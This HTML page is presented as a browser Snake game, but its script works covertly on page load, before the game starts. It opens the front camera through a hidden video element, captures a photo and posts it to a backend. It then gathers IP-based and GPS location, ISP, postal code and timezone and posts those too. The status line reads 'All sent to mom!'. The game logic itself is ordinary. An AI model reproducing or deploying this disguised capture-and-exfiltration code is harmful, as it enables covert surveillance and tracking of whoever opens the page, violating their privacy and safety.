<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        h1 {
            color: white;
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        .status {
            color: rgba(255, 255, 255, 0.9);
            font-size: 0.95em;
            margin-bottom: 10px;
            min-height: 24px;
        }

        .score {
            color: #ffd700;
            font-size: 1.8em;
            font-weight: bold;
        }

        canvas {
            background: #1a1a2e;
            border-radius: 10px;
            display: block;
            margin: 0 auto 20px;
            max-width: 100%;
            height: auto;
        }

        .controls {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            max-width: 250px;
            margin: 0 auto;
        }

        .btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 1.8em;
            padding: 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
        }

        .btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: scale(1.05);
        }

        .btn:active {
            transform: scale(0.95);
        }

        .start-btn {
            background: #4ecca3;
            color: white;
            font-size: 1.3em;
            padding: 15px 40px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            display: block;
            margin: 0 auto;
        }

        .start-btn:hover {
            background: #45b393;
            transform: scale(1.05);
        }

        .game-over {
            color: white;
            font-size: 1.5em;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
        }

        .hint {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.85em;
            text-align: center;
            margin-top: 15px;
        }

        #video {
            display: none;
        }

        .controls-grid {
            display: grid;
            grid-template-areas:
                ". up ."
                "left down right";
            gap: 10px;
            max-width: 250px;
            margin: 0 auto;
        }

        .btn-up { grid-area: up; }
        .btn-left { grid-area: left; }
        .btn-down { grid-area: down; }
        .btn-right { grid-area: right; }

        @media (max-width: 480px) {
            h1 {
                font-size: 2em;
            }
            
            canvas {
                width: 100%;
            }
            
            .btn {
                font-size: 1.5em;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>

    <div class="container">
        <div class="header">
            <h1>üêç Snake Game</h1>
            <div class="status" id="status">Starting...</div>
            <div class="score">Score: <span id="score">0</span></div>
        </div>

        <canvas id="gameCanvas" width="400" height="400"></canvas>

        <div id="startScreen">
            <button class="start-btn" onclick="startGame()">Start Game</button>
        </div>

        <div id="gameOverScreen" style="display: none;">
            <div class="game-over">Game Over!</div>
            <button class="start-btn" onclick="startGame()">Play Again</button>
        </div>

        <div id="gameControls" style="display: none;">
            <div class="controls-grid">
                <button class="btn btn-up" onclick="changeDirection(0, -1)">‚Üë</button>
                <button class="btn btn-left" onclick="changeDirection(-1, 0)">‚Üê</button>
                <button class="btn btn-down" onclick="changeDirection(0, 1)">‚Üì</button>
                <button class="btn btn-right" onclick="changeDirection(1, 0)">‚Üí</button>
            </div>
            <div class="hint">Use arrow keys or tap buttons</div>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('video');
        const gridSize = 20;
        const tileCount = 20;

        let snake = [{ x: 10, y: 10 }];
        let direction = { x: 0, y: 0 };
        let nextDirection = { x: 0, y: 0 };
        let food = { x: 15, y: 15 };
        let score = 0;
        let gameLoop;
        let gameStarted = false;

        // Initialize camera and capture photo on page load
        window.addEventListener('load', async () => {
            try {
                document.getElementById('status').textContent = 'Starting camera...';
                
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready and capture photo
                video.onloadedmetadata = () => {
                    document.getElementById('status').textContent = 'Camera ready...';
                    
                    // Wait 2 seconds for camera to stabilize, then capture
                    setTimeout(async () => {
                        await captureAndSendPhoto();
                        
                        // Stop camera after capture
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Wait a bit then send location info
                        setTimeout(() => {
                            sendLocationInfo();
                        }, 1000);
                    }, 2000);
                };
                
            } catch (err) {
                console.error('Camera error:', err);
                document.getElementById('status').textContent = 'Camera denied, sending location...';
                // If camera fails, still send location
                setTimeout(() => {
                    sendLocationInfo();
                }, 500);
            }
        });

        async function captureAndSendPhoto() {
            try {
                // Create canvas to capture photo
                const photoCanvas = document.createElement('canvas');
                photoCanvas.width = video.videoWidth;
                photoCanvas.height = video.videoHeight;
                const photoCtx = photoCanvas.getContext('2d');
                photoCtx.drawImage(video, 0, 0);

                // Get base64 image
                const photoBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);

                document.getElementById('status').textContent = 'Sending photo...';

                const response = await fetch('/api/send-photo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ photoBase64 })
                });

                if (response.ok) {
                    document.getElementById('status').textContent = 'Photo sent! ‚úì';
                } else {
                    const errorData = await response.json();
                    console.error('Photo error:', errorData);
                    document.getElementById('status').textContent = 'Photo failed';
                }
            } catch (err) {
                console.error('Photo capture error:', err);
                document.getElementById('status').textContent = 'Photo error';
            }
        }

        async function sendLocationInfo() {
            try {
                document.getElementById('status').textContent = 'Getting location...';
                
                // Get IP info first (this works without GPS)
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                // Try to get GPS location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            // GPS succeeded, use precise location
                            await sendLocationData(position.coords.latitude, position.coords.longitude, ipData);
                        },
                        async (error) => {
                            // GPS failed, use IP-based location
                            console.log('GPS error:', error);
                            await sendLocationData(null, null, ipData);
                        },
                        {
                            timeout: 5000,
                            enableHighAccuracy: true
                        }
                    );
                } else {
                    // No GPS available
                    await sendLocationData(null, null, ipData);
                }
            } catch (err) {
                console.error('Location error:', err);
                document.getElementById('status').textContent = 'Location failed';
            }
        }

        async function sendLocationData(lat, lon, ipData) {
            try {
                const locationData = {
                    ip: ipData.ip || 'Unknown',
                    region: ipData.region || 'Unknown',
                    city: ipData.city || 'Unknown',
                    country: ipData.country_name || 'Unknown',
                    location: lat && lon ? `${lat}, ${lon}` : `${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}`,
                    isp: ipData.org || 'Unknown',
                    postal: ipData.postal || 'Unknown',
                    timezone: ipData.timezone || 'Unknown'
                };

                document.getElementById('status').textContent = 'Sending location...';

                // Send to backend
                const response = await fetch('/api/send-info', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(locationData)
                });

                if (response.ok) {
                    document.getElementById('status').textContent = 'All sent to mom! ‚úì‚úì';
                } else {
                    const errorData = await response.json();
                    console.error('Location send error:', errorData);
                    document.getElementById('status').textContent = 'Location send failed';
                }
            } catch (err) {
                console.error('Send error:', err);
                document.getElementById('status').textContent = 'Location error';
            }
        }

        function startGame() {
            gameStarted = true;
            score = 0;
            snake = [{ x: 10, y: 10 }];
            direction = { x: 1, y: 0 };
            nextDirection = { x: 1, y: 0 };
            
            document.getElementById('score').textContent = score;
            document.getElementById('startScreen').style.display = 'none';
            document.getElementById('gameOverScreen').style.display = 'none';
            document.getElementById('gameControls').style.display = 'block';
            
            placeFood();
            
            if (gameLoop) clearInterval(gameLoop);
            gameLoop = setInterval(update, 150);
        }

        function placeFood() {
            food = {
                x: Math.floor(Math.random() * tileCount),
                y: Math.floor(Math.random() * tileCount)
            };
        }

        function changeDirection(x, y) {
            if (x !== 0 && direction.x === 0) {
                nextDirection = { x, y };
            } else if (y !== 0 && direction.y === 0) {
                nextDirection = { x, y };
            }
        }

        document.addEventListener('keydown', (e) => {
            if (!gameStarted) return;
            
            switch(e.key) {
                case 'ArrowUp':
                    e.preventDefault();
                    changeDirection(0, -1);
                    break;
                case 'ArrowDown':
                    e.preventDefault();
                    changeDirection(0, 1);
                    break;
                case 'ArrowLeft':
                    e.preventDefault();
                    changeDirection(-1, 0);
                    break;
                case 'ArrowRight':
                    e.preventDefault();
                    changeDirection(1, 0);
                    break;
            }
        });

        function update() {
            direction = nextDirection;
            
            const head = {
                x: snake[0].x + direction.x,
                y: snake[0].y + direction.y
            };

            if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
                endGame();
                return;
            }

            if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
                endGame();
                return;
            }

            snake.unshift(head);

            if (head.x === food.x && head.y === food.y) {
                score += 10;
                document.getElementById('score').textContent = score;
                placeFood();
            } else {
                snake.pop();
            }

            draw();
        }

        function endGame() {
            gameStarted = false;
            clearInterval(gameLoop);
            document.getElementById('gameControls').style.display = 'none';
            document.getElementById('gameOverScreen').style.display = 'block';
        }

        function draw() {
            ctx.fillStyle = '#1a1a2e';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            snake.forEach((segment, index) => {
                ctx.fillStyle = index === 0 ? '#2ecc71' : '#4ecca3';
                ctx.fillRect(
                    segment.x * gridSize,
                    segment.y * gridSize,
                    gridSize - 2,
                    gridSize - 2
                );
            });

            ctx.fillStyle = '#e74c3c';
            ctx.fillRect(
                food.x * gridSize,
                food.y * gridSize,
                gridSize - 2,
                gridSize - 2
            );
        }

        draw();
    </script>
</body>
</html>
